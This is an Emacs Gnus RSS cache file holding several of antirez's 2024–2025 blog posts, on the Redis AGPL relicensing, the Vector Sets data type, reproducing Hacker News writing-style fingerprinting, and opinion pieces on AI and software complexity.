;; -*- coding: utf-8-emacs; -*-
(setq nnrss-group-data '((105 (26644 42391 12364 126000) "http://antirez.com/news/152
" "What I learned during the license switch " nil "Fri, 02 May 2025 08:46:25 +0000" "Yesterday, it was a very intense day. In Italy it was 1st of May, the workers holiday, so in the morning I went for a 4h walk in the Etna with friends <3, I love walking, and I often take pauses when coding just to walk, to return later at the keyboard with a few more kilometers on my legs, and walking in the Etna is amazing (Etna is the largest active volcano in Europe, and I happen to live in Catania, that is on its slopes).
<br>
<br>Then at 6PM I was at home to release my blog post about the AGPL license switch, and I started following the comments, feedbacks, private messages, and I learned a few things in the process.
<br>
<br>1. Regardless of the different few clauses, that IMHO make a difference, the AGPL vs SSPL main difference is that AGPL is \"understood\". In general, yesterday for the first time I realized that in licensing there is not just what you can do and can't do, but the degree a given license is understood, tested, adopted, ...
<br>
<br>2. I was very touched by the words of Simon Willison on the matter (https://simonwillison.net/2025/May/1/redis-is-open-source-again/) because it is very peculiar that different persons, living in different parts of the world, but with a similar age and background in software, feel *so similar* about things. I, too, when was writing Vector Sets, was thinking: I would never use it if it wasn't going to be released under the AGPL (or other open source license I understand). This sentiment, multiplied by a non trivial fraction of the community, makes open source eventually win even in the complex software landscape that there is today.
<br>
<br>3. People still care a lot about software distributions. Not that I didn't care, but in the past I burned my fingers with it. I was a very initial Linux user, with SlackWare 3.1 or something like that. During the years I wrote my device drivers, contributed a few patches to the kernel, during the years Debian had maybe ~10 packages of stuff that I wrote, from hping, to the Visitors web log analyzer, dump1090, Redis, and a few more. But, eventually, I started to see all the fragmentation, the rigidity of certain processes (binary compatibility of modules for the Linux kernel), the lack of a consistent design, the lack of a binary format for software distribution with all the libs inside, and so forth. I switched to MacOS on the desktop and continued using Linux on the server in a very pragmatic way, often times more happy to \"tar xvzf software.tgz; make\" than relying on what distributions offered. And, maybe, my obsession with shipping software with zero dependencies has something to do with it. But people still care a lot, and probably it is important to have Redis as distribution packages in many situations where you want to make things as automatic and reproducible as possible? Well, now there are many folks asking if Redis will re-enter the distributions.
<br>
<br>My take on that is simple: Redis and ValKey diverged already in a significant way, and will diverge a lot more in the future. I believe distributions should have both, so that users can have a choice, and sometimes this choice is forced by the features difference. Trivially: if you need to do vector similarity searches, you need to use Redis; if instead your company has a no-AGPL policy, you need to use ValKey, and so forth.
<br>
<br>4. People are kind to me. In the comments around there were a few harsh takes, and this is normal and even healthy (after all it is part of the reason many companies believe more and more they can't use SSPL or other licenses but an OSI approved one). Yet, when addressing me personally, I see a lot of good words. I just want to say: thank you for all that.
<br>
<br>5. We kinda live in a bubble. In one of the forums out there at some point somebody said: \"But did you ever switched from Redis to one of the forks?\", and there was a chain of comments: \"never\", \"who cares if I can use it\" and so forth. And this is true for ValKey too, that if people write apt-get install redis and ValKey is installed instead, and they use SET, GET, DEL, a few more, they don't care. What I mean is that software is no longer the one in 1998 (to use a very crucial and symbolic date for open source, the Internet, and myself) where we were all open source software license experts. Most people, especially the newer generations, have a different and more practical take. So all this is very important (vital, to me), but there is to understand that not every sensibility is alike. In the end, what is the most important aspect of all, is trying to ship good software.
<a href=\"http://antirez.com/news/152\">Comments</a>" nil "http://antirez.com/news/152" "75a32f7474c16d3ef5349fc728e313c3") (104 (26643 47258 802427 670000) "http://antirez.com/news/151
" "Redis is open source again " nil "Thu, 01 May 2025 15:55:50 +0000" "Five months ago, I rejoined Redis and quickly started to talk with my colleagues about a possible switch to the AGPL license, only to discover that there was already an ongoing discussion, a very old one, too. Many people, within the company, had the feeling that the AGPL was a better pick than SSPL, and while eventually Redis switched to the SSPL license, the internal discussion continued.
<br>
<br>I tried to give more strength to the ongoing pro-AGPL license side. My feeling was that the SSPL, in practical terms, failed to be accepted by the community. The OSI wouldn’t accept it, nor would the software community regard the SSPL as an open license. In little time, I saw the hypothesis getting more and more traction, at all levels within the company hierarchy.
<br>
<br>I’ll be honest: I truly wanted the code I wrote for the new Vector Sets data type to be released under an open source license. Writing open source software is too rooted in me: I rarely wrote anything else in my career. I’m too old to start now. This may be childish, but I wrote Vector Sets with a huge amount of enthusiasm exactly because I knew Redis (and my new work) was going to be open source again.
<br>
<br>I understand that the core of our work is to improve Redis, to continue building a good system, useful, simple, able to change with the requirements of the software stack. Yet, returning back to an open source license is the basis for such efforts to be coherent with the Redis project, to be accepted by the user base, and to contribute to a human collective effort that is larger than any single company. So, honestly, while I can’t take credit for the license switch, I hope I contributed a little bit to it, because today I’m happy. I’m happy that Redis is open source software again, under the terms of the AGPLv3 license.
<br>
<br>Now, time to go back to the terminal, to show Redis users some respect by writing the best code I’m able to write, and make Vector Sets more useful and practical: I have a few more ideas for improvements, and I hope that more will be stimulated by your feedback (it is already happening). Good hacking!
<br>
<br>P.S. Redis 8, the first version of Redis with the new license, is also GA today, with a many new features and speed improvements of the core: https://redis.io/blog/redis-8-ga/
<br>
<br>You can also find the Redis CEO blog post here: https://redis.io/blog/agplv3/
<a href=\"http://antirez.com/news/151\">Comments</a>" nil "http://antirez.com/news/151" "08a9d785043ab45cfa70978f5226f1b3") (103 (26624 38274 625943 763000) "http://antirez.com/news/150
" "Reproducing Hacker News writing style fingerprinting " nil "Wed, 16 Apr 2025 13:53:16 +0000" "About three years ago I saw a quite curious and interesting post on Hacker News. A student, Christopher Tarry, was able to use cosine similarity against a vector of top words frequencies in comments, in order to detect similar HN accounts — and, sometimes, even accounts actually controlled by the same user, that is, fake accounts used to uncover the identity of the writer.
<br>
<br>This is the original post: https://news.ycombinator.com/item?id=33755016
<br>
<br>I was not aware, back then, of Burrows-Delta method for style detection: it seemed kinda magical that you just needed to normalize a frequency vector of top words to reach such quite remarkable results. I read a few wikipedia pages and took mental note of it. Then, as I was working with Vectors for Redis I remembered about this post, searched the web only to discover that the original page was gone and that the author, in the original post and website, didn’t really explained very well how the data was processed, the top words extracted (and, especially, how many were used) and so forth. I thought I could reproduce the work with Vector Sets, once I was done with the main work. Now the new data type is in the release candidate, and I found some time to work on the problem. This is a report of what I did, but before to continue, the mandatory demo site: you can play with it at the following link:
<br>
<br>https://antirez.com/hnstyle?username=pg&threshold=20&action=search
<br>
<br>NOTE: since the dataset takes 700MB of RAM, in my tiny server, in the next months I may take this down. However, later in this post you will find the link and the Github repository with the code to reproduce everything from scratch.
<br>
<br>NOTE2: I hope the web site will survive, it's a very crude Python script. I benchmarked the VSIM command in such a small server and yet it can deliver 80k VSIM per second! The wonders of int8 quantization, together with a few more optimizations. But the Python script is terrible, creates a new Redis connection each time and so forth. Fingers crossed.
<br>
<br># Raw data download and processing
<br>
<br>Well, the first problem I had, in order to do something like that, was to find an archive with Hacker News comments. Luckily there was one with apparently everything posted on HN from the start to 2023, for a huge 10GB of total data. You can find it here: https://huggingface.co/datasets/OpenPipe/hacker-news and, honestly, I’m not really sure how this was obtained, if using scarping or if HN makes this data public in some way.
<br>
<br>Since I’m not a big fan of binary files, in the specific case of public datasets at least, I used two Python scripts in order to convert the Parquet files into something smaller and simpler to handle. The first script, gen-top-words.py, takes the binary files and generates a txt file with the list of the top N words used in the dataset. It generates 10k words by default, but for the statistical analysis a lot less are needed (or, actually: if you use too many words you no longer capture the style, but the kind of content a user is talking about!). Then, another Python script, accumulates all the comments for each single user and generates a very big JSONL file where there are just two keys: the user name and the frequency table of all the words used by a given user in all the history from HN starts to 2023. Each entry is like that:
<br>
<br>{\"by\": \"rtghrhtr\", \"freqtab\": {\"everyone\": 1, \"hates\": 1, \"nvidia\": 1, \"but\": 1, \"treats\": 1, \"ati\": 1, \"as\": 1, \"an\": 1, \"afterthought\": 1, \"another\": 1, \"completely\": 1, \"useless\": 1, \"tool\": 1, \"to\": 1, \"throw\": 1, \"on\": 1, \"the\": 1, \"pile\": 1}}
<br>
<br>At this point, the final script, insert.py, could do all the real work: to apply the Borrows method for each user, create the user style vector, and insert it into Redis. The advantage of pre-processing the files (a slow operation) is that the insertion script could be called more easily with different parameters (especially the number of top words to use) in order to see the different results more promptly, without the need to re-process the Parquet files each time.
<br>
<br># How the Burrow method works?
<br>
<br>In the original post, Christopher wrote that you just need to normalize the frequency of the words usage and apply cosine similarity. Actually the process is a bit more involved. First, let’s ask ourselves, how this method actually works, in its essence? Well, it wants to capture words that each specific user over-uses or under-uses compared to the expected “average” language. To do so, we actually use the following steps (from the Python code).
<br>
<br>That’s what we do for each of the top words:
<br>
<br># Convert to relative frequency
<br>rel_freq = frequency / total_words
<br>
<br># Standardize using z-score: z = (freq - mean) / stddev
<br>mean = word_means.get(word, 0.0)
<br>stddev = word_stddevs.get(word, 1.0)  # Default to 1.0 to avoid division
<br>by zero
<br>
<br>z_score = (rel_freq - mean) / stddev
<br>
<br># Set the z-score directly in the vector at the word's index
<br>vector[word_to_index[word]] = z_score
<br>
<br>So we start by “centering” the frequency the user used a given word, by subtracting the *global* usage frequency for that word. This way, we have a number that describes how much the user under (negative) or over (positive) used such word. But, if you think at it, words that have a much higher variance among usage of different writers are less important, when they change. We want to amplify the signal of words that are under of over used by this user in a much greater way compared to the normal variance of the word. This is why we divide the centered frequency by the global standard deviation of the word. Now we have what is called the “z score”, an adjusted measure of how much a given word is an outlier in one or the other direction.
<br>
<br>Now, we are ready to insert the word into a Redis vector set, with just:
<br>
<br>VADD key FP32 [blob with 350 floats] username
<br>
<br>(I’ll not cover the details of vector sets here since you can find the doc here -> https://github.com/redis/redis/blob/unstable/modules/vector-sets/README.md)
<br>
<br>Note that Redis performs L2 normalization of the inserted vectors, but remembers the L2 value in order to return back the values when VEMB is used to retrieve the associated vector, so the z_score was set as it is.
<br>
<br>Finally, with VSIM, we can get similar users:
<br>
<br>127.0.0.1:6379> vsim hn_fingerprint ele pg
<br> 1) \"pg\"
<br> 2) \"karaterobot\"
<br> 3) \"Natsu\"
<br> 4) \"mattmaroon\"
<br> 5) \"chc\"
<br> 6) \"montrose\"
<br> 7) \"jfengel\"
<br> 8) \"emodendroket\"
<br> 9) \"vintermann\"
<br>10) \"c3534l\"
<br>
<br>All the code (but the webapp itself) can be found here: https://github.com/antirez/hnstyle
<br>
<br>The README file explains how to reproduce every part.
<br>
<br># Why 350 words?
<br>
<br>One of the things missing in the original post that stimulated this blog post, is how many top words one should use. If you use too many words, you’ll see many comments of mine about Redis, since Redis is one of the top 10k words used. Guess what? I did exactly this error, initially, and VSIM continued to report users that talked about similar topics than myself, not with similar *style*. But fortunately the Internet Archive cached the Christopher results for the “pg” account, here:
<br>
<br>https://web.archive.org/web/20221126235433/https://stylometry.net/user?username=pg
<br>
<br>So now I could tune my top-k words to get similar results. Also, reading the original papers, I discovered that, with my surprise, for the analysis to work well you need even as little as 150 words. And in general the range from 150 to 500 is considered to be optimal.
<br>
<br>Warning: don’t believe that when you search for a user you’ll find mostly fake accounts. For many fake accounts there is too little data, as often people create throw away accounts, write a few comments, and that’s it. So most of the accounts associated with a given user style will be just other people that have a similar writing style. This method I believe is quite powerful in distinguishing who is a native speaker and who is not. This is especially clear from the vectors visualization below.
<br>
<br># Validate and visualize…
<br>
<br>Another thing that I reproduced (also an idea from OP) was to try inserting the same users in two variants, like antirez_A and antirez_B, using two different set of comments. Then check if asking for similar users to antirez_A would report B. Indeed, for *most* of the users I tested this against, it worked very well, and often times it was the top result. So we know that actually our method works.
<br>
<br>But since from the vectors it is so easy to “see” a style, what about our naked eyes? Recently I switched to Ghostty as my terminal, and it supports the Kitty graphics protocol, so you can display bitmaps directly in the terminal window. It is quite some time I want to play with it. Finally I had a good reason to test this feature.
<br>
<br>img://antirez.com/misc/hnstyle_1.jpg
<br>
<br>What’s happening above is that we call the VEMB command, that returns just a list of floats (the vector).
<br>Then the vshow utility, also part of the repository, will care to find the smallest square that can contain the vector and show positive values in red, negative in green.
<br>
<br>As you can see, as a non native speaker I over-use very simple words and under-use more sophisticated words. Other authors stress certain specific words, others are much more “plain”, showing less artifacts. At some point I was curious about what was really happening there: what words I would use too much and too little? So in the demo website you can also press the button to analyze a given user, and see the top 10 words over-used and under-used. Well, a few of mine are definitely due to my issues with English grammar :D
<br>
<br>Ok, enough with this investigation! Vector sets are now in Redis 8 RC1 and I have more work to do, but this was fun, and I believe it shows that vectors were definitely cool even before AI. Thanks for reading such a long post.
<br>
<br>EDIT: I forgot to say that the insert.py script also inserts the JSON metadata with the total words written by the user. So you can use FILTER in order to only show matches with a given number of words. This can be useful to detect duplicated accounts since often they are used only seldom, when the identity must be covered:
<br>
<br>127.0.0.1:6379> vsim hn_fingerprint ele pg FILTER \".wordcount < 10000\"
<br> 1) \"montrose\"
<br> 2) \"kar5pt\"
<br> 3) \"ryusage\"
<br> 4) \"corwinstephen\"
<br> 5) \"ElfinTrousers\"
<br> 6) \"beaned\"
<br> 7) \"MichaelDickens\"
<br> 8) \"bananaface\"
<br> 9) \"area51org\"
<br>10) \"william42\"
<br>
<br>EDIT2: In case the matches look suspicious to you (meaningless), like tptacek noted in a comment in the HN submission of this blog post, here is a \"visual\" match that shows how, for instance, montrose and pg are really similar in the words usage patterns:
<br>
<br>img://antirez.com/misc/hnstyle_2.jpg
<a href=\"http://antirez.com/news/150\">Comments</a>" nil "http://antirez.com/news/150" "1f614981ba66b3c02abfe1084502dc75") (102 (26607 41481 166255 334000) "http://antirez.com/news/149
" "Vector Sets are part of Redis " nil "Thu, 03 Apr 2025 18:01:20 +0000" "Yesterday we finally merged vector sets into Redis, here you can find the README that explains in detail what you get:
<br>
<br>https://github.com/redis/redis/blob/unstable/modules/vector-sets/README.md
<br>
<br>The goal of the new data structure is, in short, to create a new “Set alike” data type, similar to Sorted Sets, where instead of having a scalar as a score, you have a vector, and you can add and remove elements the Redis way, without caring about anything except the properties of the abstract data structure Redis implements, ask for elements similar to a given query vector (or a vector associated to some element already in the set), and so forth. But more about that later, a bit of background, first:
<br>
<br>From the path of the README itself, you can see the implementation is into “modules”, but actually, Vector Sets are not a module, it’s a part of the Redis core, the thing is that I started developing them as a module, and later I suggested that the implementation should still use the modules API, in order to promote modularity of the internals of Redis, in order to have both the advantages: every Redis instance starting from Redis 8 will have Vector Sets as a native data type, and there are clear boundaries between the core and the implementation
<br>
<br>## The first new main data type of Redis after… some time
<br>
<br>I think that the latest big data structure of Redis were Streams, also developed by me. I resigned, returned, forks happened in the meantime, and it still it looks like the burden to introduce a new data type in Redis is mine :D I must say: I’m ok with that, because as much as I like programming, I also like design, a lot, and I had a feeling, that vectors, and vector similarity, are conceptually very simple, so they deserved a very simple API. And that was what I tried to do. Vector Sets are still a beta feature but I can tell you something, I can guarantee you can learn the API in 3 minutes.
<br>
<br>I decided that a fundamental requirement for implementing vector similarity was to also reimplement from scratch HNSWs (you can see my implementation in hnsw.c), because that was going to be my core data structure, and I didn’t want to grab some random code from GitHub and be happy with it. However, as I started reading the papers, I started to understand that a few pieces were missing.
<br>
<br>So, as I did in the past with HyperLogLog, where I had to fill a few gaps (here: https://antirez.com/news/75), there was already some new algorithmic challenges. Especially I wanted two things:
<br>
<br>1. To have true deletions of nodes. In Vector Sets you can add new elements with VADD, and you can remove elements with VREM. And I wanted the memory to be reclaimed ASAP.
<br>
<br>2. I wanted to be sure that as you delete elements, the connectivity properties of the HNSW graph were retained.
<br>
<br>So this lead me to a few differences compared to other implementations of HNSW. I don’t use tombstone deletions, but effectively unlink the node in the moment it gets deleted, relinking it back with other potential good neighbors. To do so, in turn, my implementation is designed to enforce that links must be reciprocal, it’s no longer a best effort property: this in turn changes quite a bit what you need to do during insertions.
<br>
<br>Another modification I did in the HNSW was to support the ability to scan the graph with a predicate function, so that you can ask for nodes matching a given expression. This requires to modify the greedy graph scanning algorithm in some way: to collect potential nodes to visit, and to collect the result set, but also to have some early stop condition in case there is too much selectivity in the query. We don’t want trigger a full graph scan, of course.
<br>
<br>Other than the HNSW modifications, I wanted a few more things that are more pragmatic and obvious:
<br>
<br>1. Threading of all the vector similarity requests. Yeah, that’s new in Redis land, but as much as I believe single thread and shared nothing was a good design in general, I think that vectors are special. They are slow, a lot slower than other data structures modeled by Redis. As a bonus point, as I was implementing threaded VSIM (the command that performs vector similarity queries) I also discovered that with a few tricks you can split the read half and the write half of writes in two parts, so that neighbors candidate collections happen in the background, and the actual insertion is performed in the foreground. This splitting however is not the default, and you need to force it with the CAS option of VADD.
<br>
<br>2. I wanted to support quantization and even make it the default. So Vector Sets ship with both 8 bit quantization and binary quantization. There is also support for random projection for dimensionality reduction. However as much as I like RP and having bin quants, the reality is that the “killer” for me is int8 quants. They are super fast, take 25% of the memory of FP32, and the results are nearly identical to those from full vectors for most vectors generated via embedding AI models.
<br>
<br>Btw the end result is, I believe, a very fast implementation. For instance in my machine, with a 3 million items vector set of 300 components each, I get 50/60k VSIM (top 10 items) per second on my laptop. But I encourage you to do your benchmarks.
<br>
<br>Also note that Vector Sets are serialized on disk as a graph, so when they are loaded back in memory, after a Redis restart, you don’t pay back the insertion time: loading every million of elements take a few seconds and not the minutes needed otherwise to add back into the in-memory HNSW.
<br>
<br>## Data structures, not indexes
<br>
<br>What I’ve said so far is all about the low level stuff. But for me the most interesting part of Vector Sets is the data model and the API supporting it. Many databases propose vector similarity as a kind of index, but that’s Redis, and things in Redis are data structures: no exception this time. You add stuff like that:
<br>
<br>> VADD mykey FP32 …blob of data… item1
<br>
<br>And so forth. So you can have many small vector sets if you want, one per key. And an important thing here is that if you split your vectors into N different keys (hashing the item you are inserting or alike to select which key to pick), then you can merge different VSIM calls against different keys into a single reply:
<br>
<br>> VSIM word_embeddings_int8 ele \"banana\" WITHSCORES COUNT 4
<br>1) \"banana\"
<br>2) \"0.9997616112232208\"
<br>3) \"bananas\"
<br>4) \"0.8758847117424011\"
<br>5) \"pineapple\"
<br>6) \"0.8288004100322723\"
<br>7) \"mango\"
<br>8) \"0.8179697692394257\"
<br>
<br>If I get a few of those results from different keys and instances, I can sort by the score (where 1 means identical, 0 opposite vector) and that’s it.
<br>
<br>So, my feeling is that Vector Sets can be composed into different patterns to handle having many vectors (they consume quite a bit of RAM) into different instances and so forth. Also it is interesting that splitting linearly scale writes, since each subset will hit a given key, and multiple insertions are possible in parallel.
<br>
<br>As usually, the Redis community will likely figure many usage patterns that are now not obvious.
<br>
<br>## How filtering works
<br>
<br>About filtering, if threading was not common in Redis, let’s imagine JSON! But for the first time, I found a good reason to expose JSON directly in the Redis API, user facing:
<br>
<br>> VGETATTR word_embeddings_int8 banana
<br>{\"len\": 6}
<br>
<br>So basically with VSETATTR / VGETATTR (and equivalent option to set the JSON attribute directly when adding the item in VADD) you can associate a string to the items you want.
<br>
<br>Then you can do things like that:
<br>
<br>> VSIM word_embeddings_int8 ele \"banana\" FILTER \".len == 3\"
<br> 1) \"yam\"
<br> 2) \"pea\"
<br> 3) \"fig\"
<br> 4) \"rum\"
<br> 5) \"ube\"
<br> 6) \"oat\"
<br> 7) \"nut\"
<br> 8) \"gum\"
<br> 9) \"soy\"
<br>10) \"pua\"
<br>
<br>The filter expression is not a programming language, is what you could write inside the if() statement of high level programming languages, with &&, ||, all the obvious operators and so forth (but I bet we will add a few more).
<br>
<br>Well, the details are into the doc, there are also memory usage examples, in depth discussions about specific features, and so forth. I will extend the documentation soon, I hope. For now I really (really!) hope you’ll enjoy Vector Sets. Please, ping me if you find bugs :)
<a href=\"http://antirez.com/news/149\">Comments</a>" nil "http://antirez.com/news/149" "4c30ee524671998a3b1249798bc892b9") (101 (26591 55054 145564 47000) "http://antirez.com/news/148
" "AI is useless, but it is our best bet for the future " nil "Sun, 23 Mar 2025 08:13:53 +0000" "I used AI with success 5 minutes ago.
<br>
<br>Just five minutes ago, I was writing a piece of software and relied on AI for assistance. Yet, here I am, starting this blog post by telling you that artificial intelligence, so far, has proven somewhat useless. How can I make such a statement if AI was just so helpful a moment ago? Actually, there's no contradiction here if we clarify exactly what we mean.
<br>
<br>Here’s the thing: at this very moment, artificial intelligence can support me significantly. If I'm struggling with complicated code or need to understand an advanced scientific paper on math, I can turn to AI for clarity. It can help me generate an image for a project, make a translation, clean my YouTube transcript. Clearly, it’s practical and beneficial in these everyday tasks.
<br>
<br>However, except for rare, groundbreaking examples like AlphaFold — Google's AI that significantly advanced our understanding of protein folding — AI has yet to genuinely push forward human knowledge in a fundamental way. Aside from these few exceptional results, AI hasn’t (obviously) yet matched the capabilities of the very best human minds. If an AI system were at the same level as the brightest humans (and not better than that:  it's not needed for a first humanity jump) we could deploy millions of such systems to accelerate research dramatically, transforming progress expected to take centuries into developments happening within decades, or decades into years.
<br>
<br>Yet, if artificial intelligence remains stuck at its current level of development indefinitely (even if with small incremental improvements, enough to fire many translators, programmers, drivers, actors, ...), perhaps it might have been better not to have it at all. I mentioned this during a conference here in Sicily. The thought hadn't crossed my mind until I was asked on stage. While I was formulating my reply I asked myself: if we knew AI would only yield minor incremental improvements, would it be worth enduring the social upheaval caused by job losses and other stresses? Possibly not. Technologies should serve humanity by enabling greater cultural development, reducing suffering, and allowing us to achieve what otherwise would be impossible. The current level of AI, while helpful, doesn't fully achieve that.
<br>
<br>That's why investing in AI is like making a bet. I advocate for further investment and continued progress — not necessarily because of what AI can currently do, but because of what it might become in the future. The advancements we see today often exceed our expectations, hinting at even greater unforeseen breakthroughs tomorrow.
<br>
<br>For us proponents of AI, the argument shouldn't hinge solely on AI’s current abilities but rather on its potential. Five years from now, AI could offer revolutionary advancements in medicine, saving countless lives. In 10 to 20 years, it might significantly contribute to environmental solutions, clarifying complex issues or providing effective methods to mitigate climate change.
<br>
<br>Even a modest breakthrough might clarify that climate change dynamics, while serious, can be controlled more effectively than we currently believe, or don't need control as they are not as dramatic as we may think, or that decisive action can resolve the problem within a manageable timeframe. The real stakes are in the future, not the present. To focus exclusively on today's AI capabilities limits our perspective and makes it challenging to convince skeptics. But if future developments meet or exceed expectations, the temporary social problems arising today would be a small price to pay for the immense benefits.
<br>
<br>However, we must be cautious. Existential risks (AI potentially becoming a catastrophic threat) are real, though minimal. We must remain vigilant and prepared. Social challenges, too, require thoughtful attention from governments and societies.
<br>
<br>Ultimately, I believe we must take the risk, persist, and explore what's beyond the frontier, because if AI fulfills even some of its enormous potential, it could redefine our capabilities, reshape society, and completely transform humanity’s future: for the better.
<br>
<br>Now, let me go back to my LLM for free and fast code review.
<a href=\"http://antirez.com/news/148\">Comments</a>" nil "http://antirez.com/news/148" "8c242a8b4dcf195a9235770b966642aa") (100 (26588 31767 84007 485000) "http://antirez.com/news/147
" "Big LLMs weights are a piece of history " nil "Sun, 16 Mar 2025 11:56:33 +0000" "By multiple accounts, the web is losing pieces: every year a fraction of old web pages disappear, lost forever. We should regard the Internet Archive as one of the most valuable pieces of modern history; instead, many companies and entities make the chances of the Archive to survive, and accumulate what otherwise will be lost, harder and harder. I understand that the Archive headquarters are located in what used to be a church: well, there is no better way to think of it than as a sacred place.
<br>
<br>Imagine the long hours spent by old programmers hacking with the Z80 assembly on their Spectrums. All the discussions about the first generation of the Internet. The subcultures that appeared during the 90s. All things that are getting lost, piece by piece.
<br>
<br>And what about the personal blogs? Pieces of life of single individuals that dumped part of their consciousness on the Internet. Scientific papers and processes that are lost forever as publishers fail, their websites shut down. Early digital art, video games, climate data once published on the Internet and now lost, and many sources of news, as well.
<br>
<br>This is a known issue and I believe that the obvious approach of trying to preserve everything is going to fail, for practical reasons: a lot of efforts for zero economic gains: the current version of the world is not exactly the best place to make efforts that cost a lot of money and don't pay money. This is why I believe that the LLMs' ability to compress information, even if imprecise, hallucinated, lacking, is better than nothing. DeepSeek V3 is already an available, public lossy compressed view of the Internet, as other very large state of-art models are.
<br>
<br>This will not bring back all the things we are losing, and we should try hard supporting The Internet Archive and other similar institutions and efforts. But, at the same time, we should focus on a much simpler effort: to make sure that the weights of LLMs publicly released do not get lost, and also to make sure that the Archive is part of the pre-training set as well.
<a href=\"http://antirez.com/news/147\">Comments</a>" nil "http://antirez.com/news/147" "5f885577aee38337ace92aa748aebf32") (99 (26588 31767 83849 288000) "http://antirez.com/news/146
" "Reasoning models are just LLMs " nil "Sun, 09 Feb 2025 18:19:38 +0000" "It’s not new, but it’s accelerating. People that used to say that LLMs were a fundamentally flawed way to reach any useful reasoning and, in general, to develop any useful tool with some degree of generality, are starting to shuffle the deck, in the hope to look less wrong. They say: “the progresses we are seeing are due to the fact that models like OpenAI o1 or DeepSeek R1 are not just LLMs”. This is false, and it is important to show their mystification as soon as possible.
<br>
<br>First, DeepSeek R1 (don’t want to talk about o1 / o3, since it’s a private thing we don’t have access to, but it’s very likely the same) is a pure decoder only autoregressive model. It’s the same next token prediction that was so strongly criticized. There isn’t, in any place of the model, any explicit symbolic reasoning or representation.
<br>
<br>Moreover, R1 Zero has similar reasoning capabilities of R1 without requiring *any* supervised fine tuning, just generating chain of thoughts, and improving it with a reward function, using reinforcement learning, was enough to learn a stronger form of reasoning. Interestingly enough, part of these capabilities were easily distilled into smaller models via SFT, which brings me to the next point.
<br>
<br>The other fundamental observation is that the S1 paper shows that you need very few examples (as little as 1000) in order for the model to start being able to build complex reasoning steps and solve non trivial mathematical problems. S1, and R1 Zero, hint that in some way in the pre-training step the models already learned the representations needed in order to perform reasoning, just with the unsupervised next word prediction training target.
<br>
<br>So it’s not just that R1 is a vanilla LLM in its fundamental structure, but also the unsupervised pre-training creates enough representations and potential that, powerful enough LLMs, with RL (and/or some minor SFT), learn to reply to complex questions the users pose (I'm referring to instruct models, an old but yet impressive capability) and to use chain of thoughts to reason about things and provide better answers.
<br>
<br>Reasoning models are just LLMs, and who said LLMs were a dead end was just wrong. Now, to be wrong happens (even if the version of being wrong, in this instance, was particularly aggressive, particularly in denial of evidences). However, trying to change the history and the terminology in order to be in the right side is, for me, unacceptable.
<a href=\"http://antirez.com/news/146\">Comments</a>" nil "http://antirez.com/news/146" "8f84d7faba5f9ff24a5d71686eeae6e8") (98 (26588 31767 83675 685000) "http://antirez.com/news/145
" "We are destroying software " nil "Sat, 08 Feb 2025 14:47:49 +0000" "We are destroying software by no longer taking complexity into account when adding features or optimizing some dimension.
<br>
<br>We are destroying software with complex build systems.
<br>
<br>We are destroying software with an absurd chain of dependencies, making everything bloated and fragile.
<br>
<br>We are destroying software telling new programmers: “Don’t reinvent the wheel!”. But, reinventing the wheel is how you learn how things work, and is the first step to make new, different wheels.
<br>
<br>We are destroying software by no longer caring about backward APIs compatibility.
<br>
<br>We are destroying software pushing for rewrites of things that work.
<br>
<br>We are destroying software by jumping on every new language, paradigm, and framework.
<br>
<br>We are destroying software by always underestimating how hard it is to work with existing complex libraries VS creating our stuff.
<br>
<br>We are destroying software by always thinking that the de-facto standard for XYZ is better than what we can do, tailored specifically for our use case.
<br>
<br>We are destroying software claiming that code comments are useless.
<br>
<br>We are destroying software mistaking it for a purely engineering discipline.
<br>
<br>We are destroying software by making systems that no longer scale down: simple things should be simple to accomplish, in any system.
<br>
<br>We are destroying software trying to produce code as fast as possible, not as well designed as possible.
<br>
<br>We are destroying software, and what will be left will no longer give us the joy of hacking.
<a href=\"http://antirez.com/news/145\">Comments</a>" nil "http://antirez.com/news/145" "9e7a13afb57c995d5c262482e2514c5e") (97 (26588 31767 83513 560000) "http://antirez.com/news/144
" "From where I left " nil "Tue, 10 Dec 2024 16:38:55 +0000" "I’m not the kind of person that develops a strong attachment to their own work. When I decided to leave Redis, about 1620 days ago (~ 4.44 years), I never looked at the source code, commit messages, or anything related to Redis again. From time to time, when I needed Redis, I just downloaded it and compiled it. I just typed “make” and I was very happy to see that, after many years, building Redis was still so simple.
<br>
<br>My detachment was not the result of me hating my past work. While in the long run my creative work was less and less important and the “handling the project” activities became more and more substantial — a shift that many programmers are able to do, but that’s not my bread and butter — well, I still enjoyed doing Redis stuff when I left. However, I don’t share the vision that most people at my age (I’m 47 now) have: that they are still young. I wanted to do new stuff, especially writing. I wanted to stay more with my family and help my relatives. I definitely needed a break.
<br>
<br>However, during the “writing years” (I’m still writing, by the way), I often returned to coding, as a way to take breaks from intense writing sessions (writing is the only mental activity I found to be a great deal more taxing than coding): I did a few embedded projects; played more with neural networks; built Telegram bots: a bit of everything. Hacking randomly was cool but, in the long run, my feeling was that I was lacking a real purpose, and every day I started to feel a bigger urgency to be part of the tech world again. At the same time, I saw the Redis community fragmenting, something that was a bit concerning to me, even as an outsider.
<br>
<br>So I started to think that maybe, after all, I could have a role back in the Redis ecosystem. Perhaps I could be able to reshape the company's attitude towards the community. Maybe I could even help to take back the role of the Redis core as the primary focus of new developments. Basically I could be some kind of “evangelist” (I don’t love the name of this role, but… well, you get it), that is, on one side, a bridge between the company and the community, but also somebody that could produce programming demos, invent and describe new patterns, write documentation, videos and blog posts about new and old stuff. And, what about the design of new stuff? I could learn from the work of people in the wild, from their difficulties, distill it, and report back design ideas, in order for Redis to evolve.
<br>
<br># Time in NY
<br>
<br>At some point my daughter, who is now 12, and is a crucial person in my life, enlightening my days with her intelligence, creativity and love, wanted to visit NYC for her birthday. We decided that yes, this was a good idea after all, we had a couple very difficult years recently, so, why not? My daughter is now more of a girl than a child. So, in NYC, I thought: maybe this is the right time, I can do a part time job. I met the new Redis CEO, Rowan Trollope, very recently, in a video call. I had the feeling that I could work with him to tune the future of the company’s relationships with the community and the codebase direction. So I wrote him an email saying: do you think I could be back in some kind of capacity? Rowan showed interest in my proposal, and quickly we found some agreement.
<br>
<br># About the license switch
<br>
<br>People will ask questions about why I *actually* did this, whether there is some back story other than what I just wrote above, if there is some agreement involved, or a big amount of money; something odd or unclear. But sometimes things are very boring: 1. I contacted the company, not the reverse. 2. I’m not getting crazy money to re-enter, it’s not about exploiting some situation — normal salary (but, disclaimer: yes, I have Redis stock options like I had before, no less, no more). 3. I don’t have huge issues with Redis changing its license; Specifically I don’t think the fracture with the community is *really* about this. But since people will ask me about that very important matter, it is better to tell you all the truth immediately.
<br>
<br># The licensing dilemma
<br>
